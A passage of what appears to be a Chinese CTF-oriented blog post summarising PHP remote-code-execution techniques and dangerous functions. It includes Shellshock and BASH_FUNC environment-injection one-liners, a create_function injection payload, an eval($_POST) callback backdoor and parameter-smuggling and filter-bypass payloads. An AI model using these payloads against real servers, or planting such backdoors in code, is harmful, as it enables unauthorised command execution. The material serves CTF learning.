<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">w<span class="token operator">></span>hp
w<span class="token operator">></span>c.p<span class="token punctuation">\</span><span class="token punctuation">\</span>
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后使用 <code>ls -t</code>，基于事件排序列出文件（从晚到早）</p>
<p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20250810173134157-4818306.png" alt="image-20250810173134157"></p>
<p>于是初见端倪，上面我们知道换行符是不影响命令执行的，为此只需要从后到前构造整段命令即可，最后<code>ls -t</code>写入文件名到目录中，用<code>sh</code>执行文件内容</p>
<p>建议使用 base64 编码构造命令以避免特殊字符</p>
<h3 id="5字符"><a href="#5字符" class="headerlink" title="5字符"></a>5字符</h3><p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge">【HITCON 2017 - babyfirst-revenge】</a></p>
<h3 id="4字符"><a href="#4字符" class="headerlink" title="4字符"></a>4字符</h3><p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#babyfirst-revenge-v2">【HITCON 2017 - BabyFirst-Revenge-v2】</a></p>
<hr>
<h2 id="Bash环境变量注入"><a href="#Bash环境变量注入" class="headerlink" title="Bash环境变量注入"></a>Bash环境变量注入</h2><p>p神经典：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令</a></p>
<p>以这段 php 代码为例：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$val</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以自由控制要写入的变量值与变量名，这里的目的就是通过注入环境变量，让 echo 执行的时候触发我们的命令</p>
<p>php 的 system 底层调用的是系统的 <code>popen</code>，而 <code>popen</code> 的底层执行了 <code>sh -c</code></p>
<ul>
<li><p>Bash ShellShock 漏洞：<code>TEST=() &#123; :; &#125;; id;</code></p>
</li>
<li><p>Bash 4.4以前：<code>env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &quot;echo hello&quot;</code></p>
</li>
<li><p>Bash 4.4及以上：<code>env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code></p>
</li>
</ul>
<hr>
<h1 id="PHP危险函数"><a href="#PHP危险函数" class="headerlink" title="PHP危险函数"></a>PHP危险函数</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//判断一个表达式是否成立。返回true or false; </span>

<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//函数是用来执行一个正则表达式的搜索和替换的  preg_replace(要搜索的字符串，用于替换的字符串，要搜索替换的字符串)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><blockquote>
<p>把字符串作为PHP代码执行</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php">https://www.php.net/manual/zh/function.eval.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>此处的 code 可视为单独 include 后的文件，继承调用 <strong>eval()</strong> 所在行的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.scope.php">变量作用域</a>。该行中任何有效变量都可在执行的代码中读取和修改。但定义的所有函数和类都将在全局命名空间中定义。<strong>eval()</strong> 里任何的变量定义、修改，都会在函数结束后被保留</p>
</li>
<li><p>code 不能包含打开&#x2F;关闭 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php">PHP tags</a>。比如， <code>&#39;echo &quot;Hi!&quot;;&#39;</code> 不能这样传入： <code>&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;</code>，但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <code>&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code></p>
</li>
<li><p>所有语句必须以分号结尾</p>
</li>
<li><p>实际上，eval() 是语言构造器而不是函数，<strong>不能在 php.ini 中使用 disable_fucntions 来禁用</strong>，若要禁用需要用到PHP的扩展Suhosin。而且不能被 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">可变函数</a> 或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.arguments.php#functions.named-arguments">命名参数</a> 调用，即 <code>$a=&quot;eval&quot;;$a();</code> 是不可行的</p>
</li>
</ul>
<hr>
<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><blockquote>
<p>输出关于 PHP 配置的信息</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.phpinfo.php">https://www.php.net/manual/zh/function.phpinfo.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token constant">INFO_ALL</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息（License）</p>
<ul>
<li>常见的<strong>无参函数</strong>之一</li>
<li>固定返回 true</li>
</ul>
<p>值得关注的内容：</p>
<ul>
<li><p>系统环境变量：如 FLAG</p>
</li>
<li><p>配置文件路径：如 &#x2F;etc&#x2F;php&#x2F;7.4&#x2F;apache2&#x2F;php.ini 或 &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</p>
</li>
<li><p>disable_functions：查看禁用的函数</p>
</li>
<li><p>open_basedir：查看文件访问限制</p>
</li>
<li><p>extensions_dir：插件路径</p>
</li>
<li><p>Loaded Configuration File：php.ini 路径</p>
</li>
<li><p>Session部分：常用于 <a href="blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session文件包含</a> 或 <a href="/blog/2023/03/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">session反序列化</a></p>
<ul>
<li>Session Support</li>
<li>session.upload_progress.enabled</li>
<li>session.auto_start：若开启则不需要 session_start()</li>
<li>session.use_strict_mode：自定义session id</li>
<li>session.save_path：未配置则不会生成session文件</li>
<li>session.upload_progress_enabled</li>
<li>session.upload_progress_cleanup</li>
<li>session.serialize_handler</li>
</ul>
</li>
<li><p>$_SERVER[‘DOCUMENT_ROOT’]：网站的绝对路径</p>
</li>
<li><p>register_argc_argv：<a href="/blog/2023/07/25/LFI%E5%8C%85%E5%90%ABpearcmd-php%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">pearcmd</a></p>
</li>
<li><p>Opcache拓展：见 Opcache 缓存文件 RCE</p>
<ul>
<li>opcache.enable</li>
<li>opcache.file_cache</li>
<li>opcache.file_cache_only</li>
</ul>
</li>
<li><p>Soap Client：反序列化打 ssrf</p>
</li>
<li><p>Server API：如果是 CGI&#x2F;FastCGI 则有 CGI 参数注入</p>
</li>
</ul>
<hr>
<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><blockquote>
<p>把第一个参数作为回调函数调用，其余参数是回调函数的参数</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">mixed</span> <span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>$callback 是要调用的函数名或者回调函数，可以是一个字符串（表示函数名），也可以是一个数组（表示对象方法或类静态方法）</li>
<li>call_user_func_array 第二个参数需要传入一个数组，即要执行函数的参数以数组形式传入</li>
</ul>
<p>eg：</p>
<p>函数调用：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">,</span><span class="token variable">$test2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$test1</span> <span class="token operator">.</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出结果为ab</span>
<span class="token keyword">echo</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>类静态方法调用：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">myclass</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello!\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myclass"</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 数组调用类的方法</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$classname</span> <span class="token operator">.</span><span class="token string single-quoted-string">'::say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 直接调用</span>
<span class="token variable">$myobject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$myobject</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//先实例化后调用</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>ctfshow web137,138</p>
</blockquote>
<p>命令执行：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 回调后门，带到post请求里进行任意命令执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<hr>
<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><blockquote>
<p>通过执行代码字符串创建动态函数</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function.php">https://www.php.net/manual/zh/function.create-function.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$args</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
<span class="token comment">//string $args 声明的函数变量部分（不声明的话就是无参函数）</span>
<span class="token comment">//string $code 执行的方法代码部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>创建全局匿名函数（无法释放），并为其返回唯一名称。这个函数的名称中有不可见字符，在url编码后为<code>%00lambda_&#123;id&#125;</code>，其中 id 为该进程内创建的第几个匿名函数，如第二个匿名函数即为 <code>%00lambda_2</code></li>
<li>PHP7.2 开始被废弃但仍可使用，PHP8 被移除</li>
<li>此函数会在内部执行 eval()，因此具有和 eval() 一样的风险</li>
</ul>
<p>eg：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo $name. '</span><span class="token operator">.</span><span class="token string single-quoted-string">'的编号是'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'; '</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$name'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>create_function</code>的操作会产生一个新的匿名函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$name'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 内部实现</span>
<span class="token keyword">function</span> <span class="token function-definition function">__lambda_func</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"的编号是"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token variable">$b</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C1oudfL0w0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 即 __lambda_func('C1oudfL0w0')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为 id 参数是我们可控输入的，可以使用<code>;&#125;</code>在 id 处提前闭合这个匿名函数，然后注入我们的 php 代码，最后用<code>/*</code>把后面的内容注释掉</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时内部 eval 的内容为：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__lambda_func</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"的编号是2"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后就能执行 phpinfo()</p>
<p>题目：ctfshow web147</p>
<hr>
<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$assertion</span><span class="token punctuation">,</span> <span class="token class-name">Throwable</span><span class="token operator">|</span><span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$description</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>测试表达式是否为真。</p>
<p>PHP 8.0.0 之前，如果 <code>assertion</code> 是字符串，将解释为 PHP 代码并通过 <code>eval()</code> 执行。<br>PHP 8.0.0 后移除该功能</p>
<hr>
<h2 id="可执行系统命令的函数"><a href="#可执行系统命令的函数" class="headerlink" title="可执行系统命令的函数"></a>可执行系统命令的函数</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php">https://www.php.net/manual/zh/ref.exec.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$result_code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>

<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$result_code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">false</span>
<span class="token comment">// 执行外部程序并且显示原始输出，只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上</span>
  
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$result_code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
<span class="token comment">// 执行一个外部程序,命令执行结果的最后一行内容</span>
  
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
<span class="token comment">// 命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<ul>
<li><p><strong>pcntl_exec()</strong></p>
<blockquote>
<p>在当前进程空间执行指定程序</p>
</blockquote>
</li>
<li><p><strong>popen()</strong></p>
<blockquote>
<p>不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">popen</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'whoami >> c:/1.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /tmp/test"</span><span class="token punctuation">;</span>  
    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//popen打一个进程通道  </span>
  
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//从通道里面取得东西  </span>
        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
         <span class="token keyword">echo</span>  <span class="token variable">$out</span><span class="token punctuation">;</span>         <span class="token comment">//打印出来  </span>
    <span class="token punctuation">&#125;</span>  
    <span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>执行运算符``：命令执行，内联执行</p>
<blockquote>
<p>与shell_exec功能相同，执行shell命令并返回输出的字符串</p>
</blockquote>
</li>
<li><p><strong>&gt;</strong></p>
<blockquote>
<p>重定向符</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> “<span class="token number">123</span>” <span class="token operator">></span> <span class="token operator">/</span>home<span class="token operator">/</span><span class="token number">123.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>写入的内容会永远消失，也就是不进行回显，需用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>将标准输出1重定向到&#x2F;dev&#x2F;null中。 &#x2F;dev&#x2F;null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;&#x2F;dev&#x2F;null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>2&gt; 表示stderr标准错误</p>
<p>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</p>
<p>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于 “1&gt;&#x2F;dev&#x2F;null”</p>
</blockquote>
<p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20230305110214437.png" alt="image-20230305110214437"></p>
</li>
<li><p>&amp;：按位与</p>
</li>
<li><p>&amp;&amp;：逻辑与</p>
</li>
<li><p>|：按位或，直接执行下一条语句</p>
</li>
<li><p>||：逻辑或</p>
</li>
<li><p>;：在 shell 中，是”连续指令”，执行下一条语句</p>
</li>
<li><p>scandir(‘&#x2F;‘)：列出指定路径中的文件和目录</p>
</li>
<li><p>file_get_contents(‘&#x2F;flag’)：读取文件</p>
</li>
<li><p>find：查找与指定参数条件匹配的文件及目录列表</p>
<ul>
<li>-name：按文件名称查找</li>
</ul>
</li>
</ul>
<h2 id="php函数层面绕过"><a href="#php函数层面绕过" class="headerlink" title="php函数层面绕过"></a>php函数层面绕过</h2><ul>
<li><p>参数带外：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac%20flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>文件包含参数带外：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token keyword">include</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>伪协议<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>绕过preg_replace：针对<code>preg_replace(&quot;/system/&quot;,&#39;&#39;,$a);</code>的一次替换</p>
<p>令 <code>$a=syssystemtem</code> 即可实现绕过</p>
</li>
</ul>
<hr>
<h2 id="PHP无字母数字rce"><a href="#PHP无字母数字rce" class="headerlink" title="PHP无字母数字rce"></a>PHP无字母数字rce</h2><p>原型：对以下代码的绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Za-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
或
